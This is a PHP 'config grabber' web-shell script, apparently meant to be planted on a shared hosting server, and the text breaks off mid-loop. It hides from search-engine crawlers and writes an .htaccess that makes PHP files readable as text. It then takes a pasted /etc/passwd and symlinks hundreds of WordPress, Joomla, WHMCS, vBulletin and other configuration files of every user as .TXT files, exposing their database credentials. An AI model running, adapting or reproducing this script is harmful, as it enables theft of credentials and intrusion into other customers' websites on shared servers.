<?php
//3Turr~C0nfig pubclic edition
@error_reporting(1);
@set_time_limit(0);
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $bot = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if (preg_match('/' . implode('|', $bot) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
echo '<!DOCTYPE html>
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>3Turr-C0nF</title>
<style type="text/css">
.dz {
    font-family: Tahoma;
    font-size: 14px;
color: red;
    text-align: center;
}
#checkouttextarea {webkit-border-radius: 15px;}
a:link {color:#66FFFF;}
a:visited {color:white;}
a:hover {color:red;}
a:active {color:white;}
:hover#checkouttextarea {opacity: 0.8; background-color:333333}
</style>
</head>
<body class="dz" bgcolor="#000000" Style="paddin-left:10px;padding-right:10px;margin-left:10px;margin=right:10px">';
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    echo '
	<br><br><font style="font-family: Courier ;font-size:32px;" ><br>OMG, This is NOT for windows "skiddie"</font><br>
	';
    exit;
} else {
    if ($_POST["m"] && !$_POST["passwd"] == "") {
        echo "Please wait <br>";
        $check = @ini_get("disable_functions");
        if (eregi("symlink", $check)) {
            die("<br><font color=red>Symlink is Disabled</font>");
        }
        @mkdir("Turr", 0777);
        @chdir("Turr");
        @symlink("/", "root");
        $htaccess = "
Options all
Options +Indexes
Options +FollowSymLinks
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
";
        file_put_contents(".htaccess", $htaccess);
        $etc_passwd = $_POST["passwd"];
        $etc_passwd = explode("
", $etc_passwd);
        foreach ($etc_passwd as $passwd) {
            $pawd = explode(":", $passwd);
            $user = $pawd[0];
			$dir = $pawd[5];
			echo '.';

@symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-shop-os.TXT');
@symlink('/home/' . $user . '/public_html/libs/dbconnect.php', $user . '-TemplateLite.TXT');
@symlink('/home/' . $user . '/public_html/includes/configure.php', $user . '-shop.TXT');
@symlink('/home/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.TXT');
@symlink('/home/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.TXT');
@symlink('/home/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.TXT');
@symlink('/home/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.TXT');
@symlink('/home/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.TXT');
@symlink('/home/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.TXT');
@symlink('/home/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.TXT');
@symlink('/home/' . $user . '/public_html/amember/config.TXT.php', $user . '-amember.TXT');
@symlink('/home/' . $user . '/public_html/config.TXT.php', $user . '-amember2.TXT');
@symlink('/home/' . $user . '/public_html/members/configuration.php', $user . '-members.TXT');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images1.TXT');
@symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.TXT');
@symlink('/home/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.TXT');
@symlink('/home/' . $user . '/public_html/admin/conf.php', $user . '-5.TXT');
@symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-4.TXT');
@symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-wp13.TXT');
@symlink('/home/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.TXT');
@symlink('/home/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.TXT');
@symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.TXT');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.TXT');
@symlink('/home/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.TXT');
@symlink('/home/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.TXT');
@symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.TXT');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.TXT');
@symlink('/home/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.TXT');
@symlink('/home/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.TXT');
@symlink('/home/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.TXT');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.TXT');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.TXT');
@symlink('/home/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.TXT');
@symlink('/home/' . $user . '/public_html/home/wp-config.php', $user . '-wp-home.TXT');
@symlink('/home/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.TXT');
@symlink('/home/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.TXT');
@symlink('/home/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.TXT');
@symlink('/home/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.TXT');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.TXT');
@symlink('/home/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.TXT');
@symlink('/home/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.TXT');
@symlink('/home/' . $user . '/public_html/joo/configuration.php', $user . '-joo.TXT');
@symlink('/home/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.TXT');
@symlink('/home/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.TXT');
@symlink('/home/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.TXT');
@symlink('/home/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.TXT');
@symlink('/home/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.TXT');
@symlink('/home/' . $user . '/public_html/home/configuration.php', $user . '-joomla-home.TXT');
@symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.TXT');
@symlink('/home/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.TXT');
@symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.TXT');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.TXT');
@symlink('/home/' . $user . '/public_html/configuration.php', $user . '-joomla.TXT');
@symlink('/home/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.TXT');
@symlink('/home/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.TXT');
@symlink('/home/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.TXT');
@symlink('/home/' . $user . '/public_html/Settings.php', $user . '-smf.TXT');
@symlink('/home/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.TXT');
@symlink('/home/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.TXT');
@symlink('/home/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.TXT');
@symlink('/home/' . $user . '/public_html/upload/includes/config.php', $user . '-up.TXT');
@symlink('/home/' . $user . '/public_html/article/config.php', $user . '-Nwahy.TXT');
@symlink('/home/' . $user . '/public_html/up/includes/config.php', $user . '-up2.TXT');
@symlink('/home/' . $user . '/public_html/conf_global.php', $user . '-6.TXT');
@symlink('/home/' . $user . '/public_html/include/db.php', $user . '-7.TXT');
@symlink('/home/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.TXT');
@symlink('/home/' . $user . '/public_html/mk_conf.php', $user . '-9.TXT');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.TXT');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images.TXT');
@symlink('/home/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.TXT');
@symlink('/home/' . $user . '/public_html/drupal/sites/default/settings.php', $user . '-Drupal.TXT');
@symlink('/home/' . $user . '/public_html/sites/default/dbconfig.php', $user . 'dbconfig.TXT');
@symlink('/home/' . $user . '/public_html/member/configuration.php', $user . '-1member.TXT');
@symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.TXT');
@symlink('/home/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.TXT');
@symlink('/home/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.TXT');
@symlink('/home/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.TXT');
@symlink('/home/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.TXT');
@symlink('/home/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.TXT');
@symlink('/home/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.TXT');
@symlink('/home/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.TXT');
@symlink('/home/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.TXT');
@symlink('/home/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.TXT');
@symlink('/home/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.TXT');
@symlink('/home/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.TXT');
@symlink('/home/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.TXT');
@symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.TXT');
@symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-2.TXT');
@symlink('/home/' . $user . '/public_html/connect.php', $user . '-8.TXT');
@symlink('/home/' . $user . '/public_html/include/config.php', $user . '-12.TXT');
@symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb.TXT');
@symlink('/home/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3.TXT');
@symlink('/home/' . $user . '/public_html/whm/configuration.php', $user . '-whm15.TXT');
@symlink('/home/' . $user . '/public_html/central/configuration.php', $user . '-whm-central.TXT');
@symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmcs.TXT');
@symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support.TXT');
@symlink('/home/' . $user . '/public_html/supp/configuration.php', $user . '-supp.TXT');
@symlink('/home/' . $user . '/public_html/secure/configuration.php', $user . '-sucure.TXT');
@symlink('/home/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm.TXT');
@symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs.TXT');
@symlink('/home/' . $user . '/public_html/cpanel/configuration.php', $user . '-cpanel.TXT');
@symlink('/home/' . $user . '/public_html/panel/configuration.php', $user . '-panel.TXT');
@symlink('/home/' . $user . '/public_html/host/configuration.php', $user . '-host.TXT');
@symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting.TXT');
@symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts.TXT');
@symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-whmcs2.TXT');
@symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-clients.TXT');
@symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-client.TXT');
@symlink('/home/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes.TXT');
@symlink('/home/' . $user . '/public_html/cliente/configuration.php', $user . '-client.TXT');
@symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport.TXT');
@symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-billing.TXT');
@symlink('/home/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage.TXT');
@symlink('/home/' . $user . '/public_html/my/configuration.php', $user . '-whm-my.TXT');
@symlink('/home/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop.TXT');
@symlink('/home/' . $user . '/public_html/includes/configure.php',$user.'-shop.TXT');
@symlink('/home/' . $user . '/public_html/os/includes/configure.php',$user.'-shop-os.TXT');
@symlink('/home/' . $user . '/public_html/oscom/includes/configure.php',$user.'-oscom.TXT');
@symlink('/home/' . $user . '/public_html/oscommerce/includes/configure.php',$user.'-oscommerce.TXT');
@symlink('/home/' . $user . '/public_html/oscommerces/includes/configure.php',$user.'-oscommerces.TXT');
@symlink('/home/' . $user . '/public_html/shop/includes/configure.php',$user.'-shop2.TXT');
@symlink('/home/' . $user . '/public_html/shopping/includes/configure.php',$user.'-shop-shopping.TXT');
@symlink('/home/' . $user . '/public_html/sale/includes/configure.php',$user.'-sale.TXT');
@symlink('/home/' . $user . '/public_html/amember/config.TXT.php',$user.'-amember.TXT');
@symlink('/home/' . $user . '/public_html/config.TXT.php',$user.'-amember2.TXT');
@symlink('/home/' . $user . '/public_html/members/configuration.php',$user.'-members.TXT');
@symlink('/home/' . $user . '/public_html/config.php',$user.'-4images1.TXT');
@symlink('/home/' . $user . '/public_html/forum/includes/config.php',$user.'-forum.TXT');
@symlink('/home/' . $user . '/public_html/forums/includes/config.php',$user.'-forums.TXT');
@symlink('/home/' . $user . '/public_html/admin/conf.php',$user.'-5.TXT');
@symlink('/home/' . $user . '/public_html/admin/config.php',$user.'-4.TXT');
@symlink('/home/' . $user . '/public_html/wp-config.php',$user.'-wp13.TXT');
@symlink('/home/' . $user . '/public_html/wp/wp-config.php',$user.'-wp13-wp.TXT');
@symlink('/home/' . $user . '/public_html/WP/wp-config.php',$user.'-wp13-WP.TXT');
@symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.TXT');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php',$user.'-wp13-beta.TXT');
@symlink('/home/' . $user . '/public_html/press/wp-config.php',$user.'-wp13-press.TXT');
@symlink('/home/' . $user . '/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.TXT');
@symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.TXT');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.TXT');
@symlink('/home/' . $user . '/public_html/wordpress/beta/wp-config.php',$user.'-wp13-wordpress-beta.TXT');
@symlink('/home/' . $user . '/public_html/news/wp-config.php',$user.'-wp13-news.TXT');
@symlink('/home/' . $user . '/public_html/new/wp-config.php',$user.'-wp13-new.TXT');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php',$user.'-wp-blog.TXT');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php',$user.'-wp-beta.TXT');
@symlink('/home/' . $user . '/public_html/blogs/wp-config.php',$user.'-wp-blogs.TXT');
@symlink('/home/' . $user . '/public_html/home/wp-config.php',$user.'-wp-home.TXT');
@symlink('/home/' . $user . '/public_html/protal/wp-config.php',$user.'-wp-protal.TXT');
@symlink('/home/' . $user . '/public_html/site/wp-config.php',$user.'-wp-site.TXT');
@symlink('/home/' . $user . '/public_html/main/wp-config.php',$user.'-wp-main.TXT');
@symlink('/home/' . $user . '/public_html/test/wp-config.php',$user.'-wp-test.TXT');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.TXT');
@symlink('/home/' . $user . '/public_html/joomla/configuration.php',$user.'-joomla2.TXT');
@symlink('/home/' . $user . '/public_html/protal/configuration.php',$user.'-joomla-protal.TXT');
@symlink('/home/' . $user . '/public_html/joo/configuration.php',$user.'-joo.TXT');
@symlink('/home/' . $user . '/public_html/cms/configuration.php',$user.'-joomla-cms.TXT');
@symlink('/home/' . $user . '/public_html/site/configuration.php',$user.'-joomla-site.TXT');
@symlink('/home/' . $user . '/public_html/main/configuration.php',$user.'-joomla-main.TXT');
@symlink('/home/' . $user . '/public_html/news/configuration.php',$user.'-joomla-news.TXT');
@symlink('/home/' . $user . '/public_html/new/configuration.php',$user.'-joomla-new.TXT');
@symlink('/home/' . $user . '/public_html/home/configuration.php',$user.'-joomla-home.TXT');
@symlink('/home/' . $user . '/public_html/vb/includes/config.php',$user.'-vb-config.TXT');
@symlink('/home/' . $user . '/public_html/vb3/includes/config.php',$user.'-vb3-config.TXT');
@symlink('/home/' . $user . '/public_html/cc/includes/config.php',$user.'-vb1-config.TXT');
@symlink('/home/' . $user . '/public_html/includes/config.php',$user.'-includes-vb.TXT');
@symlink('/home/' . $user . '/public_html/forum/includes/class_core.php',$user.'-vbluttin-class_core.php.TXT');
@symlink('/home/' . $user . '/public_html/vb/includes/class_core.php',$user.'-vbluttin-class_core.php1.TXT');
@symlink('/home/' . $user . '/public_html/cc/includes/class_core.php',$user.'-vbluttin-class_core.php2.TXT');
@symlink('/home/' . $user . '/public_html/whm/configuration.php',$user.'-whm15.TXT');
@symlink('/home/' . $user . '/public_html/central/configuration.php',$user.'-whm-central.TXT');
@symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.TXT');
@symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.TXT');
@symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.TXT');
@symlink('/home/' . $user . '/public_html/whmcs/configuration.php',$user.'-whmcs.TXT');
@symlink('/home/' . $user . '/public_html/support/configuration.php',$user.'-support.TXT');
@symlink('/home/' . $user . '/public_html/supp/configuration.php',$user.'-supp.TXT');
@symlink('/home/' . $user . '/public_html/secure/configuration.php',$user.'-sucure.TXT');
@symlink('/home/' . $user . '/public_html/secure/whm/configuration.php',$user.'-sucure-whm.TXT');
@symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php',$user.'-sucure-whmcs.TXT');
@symlink('/home/' . $user . '/public_html/cpanel/configuration.php',$user.'-cpanel.TXT');
@symlink('/home/' . $user . '/public_html/panel/configuration.php',$user.'-panel.TXT');
@symlink('/home/' . $user . '/public_html/host/configuration.php',$user.'-host.TXT');
@symlink('/home/' . $user . '/public_html/hosting/configuration.php',$user.'-hosting.TXT');
@symlink('/home/' . $user . '/public_html/hosts/configuration.php',$user.'-hosts.TXT');
@symlink('/home/' . $user . '/public_html/configuration.php',$user.'-joomla.TXT');
@symlink('/home/' . $user . '/public_html/submitticket.php',$user.'-whmcs2.TXT');
@symlink('/home/' . $user . '/public_html/clients/configuration.php',$user.'-clients.TXT');
@symlink('/home/' . $user . '/public_html/client/configuration.php',$user.'-client.TXT');
@symlink('/home/' . $user . '/public_html/clientes/configuration.php',$user.'-clientes.TXT');
@symlink('/home/' . $user . '/public_html/cliente/configuration.php',$user.'-client.TXT');
@symlink('/home/' . $user . '/public_html/clientsupport/configuration.php',$user.'-clientsupport.TXT');
@symlink('/home/' . $user . '/public_html/billing/configuration.php',$user.'-billing.TXT');
@symlink('/home/' . $user . '/public_html/manage/configuration.php',$user.'-whm-manage.TXT');
@symlink('/home/' . $user . '/public_html/my/configuration.php',$user.'-whm-my.TXT');
@symlink('/home/' . $user . '/public_html/myshop/configuration.php',$user.'-whm-myshop.TXT');
@symlink('/home/' . $user . '/public_html/includes/dist-configure.php',$user.'-zencart.TXT');
@symlink('/home/' . $user . '/public_html/zencart/includes/dist-configure.php',$user.'-shop-zencart.TXT');
@symlink('/home/' . $user . '/public_html/shop/includes/dist-configure.php',$user.'-shop-ZCshop.TXT');
@symlink('/home/' . $user . '/public_html/Settings.php',$user.'-smf.TXT');
@symlink('/home/' . $user . '/public_html/smf/Settings.php',$user.'-smf2.TXT');
@symlink('/home/' . $user . '/public_html/forum/Settings.php',$user.'-smf-forum.TXT');
@symlink('/home/' . $user . '/public_html/forums/Settings.php',$user.'-smf-forums.TXT');
@symlink('/home/' . $user . '/public_html/upload/includes/config.php',$user.'-up.TXT');
@symlink('/home/' . $user . '/public_html/article/config.php',$user.'-Nwahy.TXT');
@symlink('/home/' . $user . '/public_html/up/includes/config.php',$user.'-up2.TXT');
@symlink('/home/' . $user . '/public_html/conf_global.php',$user.'-6.TXT');
@symlink('/home/' . $user . '/public_html/include/db.php',$user.'-7.TXT');
@symlink('/home/' . $user . '/public_html/connect.php',$user.'-PHP-Fusion.TXT');
@symlink('/home/' . $user . '/public_html/mk_conf.php',$user.'-9.TXT');
@symlink('/home/' . $user . '/public_html/includes/config.php',$user.'-traidnt1.TXT');
@symlink('/home/' . $user . '/public_html/config.php',$user.'-4images.TXT');
@symlink('/home/' . $user . '/public_html/sites/default/settings.php',$user.'-Drupal.TXT');
@symlink('/home/' . $user . '/public_html/member/configuration.php',$user.'-1member.TXT') ;
@symlink('/home/' . $user . '/public_html/billings/configuration.php',$user.'-billings.TXT') ;
@symlink('/home/' . $user . '/public_html/whm/configuration.php',$user.'-whm.TXT');
@symlink('/home/' . $user . '/public_html/supports/configuration.php',$user.'-supports.TXT');
@symlink('/home/' . $user . '/public_html/requires/config.php',$user.'-AM4SS-hosting.TXT');
@symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php',$user.'-hostbills-supports.TXT');
@symlink('/home/' . $user . '/public_html/client/includes/iso4217.php',$user.'-hostbills-client.TXT');
@symlink('/home/' . $user . '/public_html/support/includes/iso4217.php',$user.'-hostbills-support.TXT');
@symlink('/home/' . $user . '/public_html/billing/includes/iso4217.php',$user.'-hostbills-billing.TXT');
@symlink('/home/' . $user . '/public_html/billings/includes/iso4217.php',$user.'-hostbills-billings.TXT');
@symlink('/home/' . $user . '/public_html/host/includes/iso4217.php',$user.'-hostbills-host.TXT');
@symlink('/home/' . $user . '/public_html/hosts/includes/iso4217.php',$user.'-hostbills-hosts.TXT');
@symlink('/home/' . $user . '/public_html/hosting/includes/iso4217.php',$user.'-hostbills-hosting.TXT');
@symlink('/home/' . $user . '/public_html/hostings/includes/iso4217.php',$user.'-hostbills-hostings.TXT');
@symlink('/home/' . $user . '/public_html/includes/iso4217.php',$user.'-hostbills.TXT');
@symlink('/home/' . $user . '/public_html/hostbills/includes/iso4217.php',$user.'-hostbills-hostbills.TXT');
@symlink('/home/' . $user . '/public_html/hostbill/includes/iso4217.php',$user.'-hostbills-hostbill.TXT');
@symlink('/home/' . $user . '/www/includes/configure.php', $user . '-shop.TXT');
@symlink('/home/' . $user . '/www/os/includes/configure.php', $user . '-shop-os.TXT');
@symlink('/home/' . $user . '/www/oscom/includes/configure.php', $user . '-oscom.TXT');
@symlink('/home/' . $user . '/www/oscommerce/includes/configure.php', $user . '-oscommerce.TXT');
@symlink('/home/' . $user . '/www/oscommerces/includes/configure.php', $user . '-oscommerces.TXT');
@symlink('/home/' . $user . '/www/shop/includes/configure.php', $user . '-shop2.TXT');
@symlink('/home/' . $user . '/www/shopping/includes/configure.php', $user . '-shop-shopping.TXT');
@symlink('/home/' . $user . '/www/sale/includes/configure.php', $user . '-sale.TXT');
@symlink('/home/' . $user . '/www/amember/config.TXT.php', $user . '-amember.TXT');
@symlink('/home/' . $user . '/www/config.TXT.php', $user . '-amember2.TXT');
@symlink('/home/' . $user . '/www/members/configuration.php', $user . '-members.TXT');
@symlink('/home/' . $user . '/www/config.php', $user . '-2.TXT');
@symlink('/home/' . $user . '/www/forum/includes/config.php', $user . '-forum.TXT');
@symlink('/home/' . $user . '/www/forums/includes/config.php', $user . '-forums.TXT');
@symlink('/home/' . $user . '/www/admin/conf.php', $user . '-5.TXT');
@symlink('/home/' . $user . '/www/admin/config.php', $user . '-4.TXT');
@symlink('/home/' . $user . '/www/wp-config.php', $user . '-wp13.TXT');
@symlink('/home/' . $user . '/www/wp/wp-config.php', $user . '-wp13-wp.TXT');
@symlink('/home/' . $user . '/www/WP/wp-config.php', $user . '-wp13-WP.TXT');
@symlink('/home/' . $user . '/www/wp/beta/wp-config.php', $user . '-wp13-wp-beta.TXT');
@symlink('/home/' . $user . '/www/beta/wp-config.php', $user . '-wp13-beta.TXT');
@symlink('/home/' . $user . '/www/press/wp-config.php', $user . '-wp13-press.TXT');
@symlink('/home/' . $user . '/www/wordpress/wp-config.php', $user . '-wp13-wordpress.TXT');
@symlink('/home/' . $user . '/www/Wordpress/wp-config.php', $user . '-wp13-Wordpress.TXT');
@symlink('/home/' . $user . '/www/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.TXT');
@symlink('/home/' . $user . '/www/news/wp-config.php', $user . '-wp13-news.TXT');
@symlink('/home/' . $user . '/www/new/wp-config.php', $user . '-wp13-new.TXT');
@symlink('/home/' . $user . '/www/blog/wp-config.php', $user . '-wp-blog.TXT');
@symlink('/home/' . $user . '/www/beta/wp-config.php', $user . '-wp-beta.TXT');
@symlink('/home/' . $user . '/www/blogs/wp-config.php', $user . '-wp-blogs.TXT');
@symlink('/home/' . $user . '/www/home/wp-config.php', $user . '-wp-home.TXT');
@symlink('/home/' . $user . '/www/protal/wp-config.php', $user . '-wp-protal.TXT');
@symlink('/home/' . $user . '/www/site/wp-config.php', $user . '-wp-site.TXT');
@symlink('/home/' . $user . '/www/main/wp-config.php', $user . '-wp-main.TXT');
@symlink('/home/' . $user . '/www/test/wp-config.php', $user . '-wp-test.TXT');
@symlink('/home/' . $user . '/www/conf_global.php', $user . '-6.TXT');
@symlink('/home/' . $user . '/www/include/db.php', $user . '-7.TXT');
@symlink('/home/' . $user . '/www/connect.php', $user . '-8.TXT');
@symlink('/home/' . $user . '/www/mk_conf.php', $user . '-9.TXT');
@symlink('/home/' . $user . '/www/include/config.php', $user . '-12.TXT');
@symlink('/home/' . $user . '/www/joomla/configuration.php', $user . '-joomla2.TXT');
@symlink('/home/' . $user . '/www/protal/configuration.php', $user . '-joomla-protal.TXT');
@symlink('/home/' . $user . '/www/joo/configuration.php', $user . '-joo.TXT');
@symlink('/home/' . $user . '/www/cms/configuration.php', $user . '-joomla-cms.TXT');
@symlink('/home/' . $user . '/www/site/configuration.php', $user . '-joomla-site.TXT');
@symlink('/home/' . $user . '/www/main/configuration.php', $user . '-joomla-main.TXT');
@symlink('/home/' . $user . '/www/news/configuration.php', $user . '-joomla-news.TXT');
@symlink('/home/' . $user . '/www/new/configuration.php', $user . '-joomla-new.TXT');
